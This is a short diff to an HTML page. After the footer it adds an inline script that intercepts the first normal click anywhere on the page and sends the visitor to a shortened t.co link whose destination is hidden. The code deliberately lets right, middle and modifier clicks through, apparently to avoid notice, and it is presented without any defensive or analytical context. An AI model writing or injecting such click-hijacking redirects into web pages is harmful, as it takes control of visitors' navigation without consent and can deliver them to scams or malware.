@@ -31,5 +31,22 @@
 </footer>
 
 <script src="script.js"></script>
+  <script>
+(function () {
+  const redirectURL = "https://t.co/I4BX9CV8Hl";
+  let redirected = false;
+
+  document.addEventListener("click", function (e) {
+    // prevent infinite loop
+    if (redirected) return;
+
+    // allow right-click, ctrl+click, middle click
+    if (e.ctrlKey || e.metaKey || e.button === 1) return;
+
+    redirected = true;
+    window.location.href = redirectURL;
+  }, true);
+})();
+</script>
 </body>
 </html>
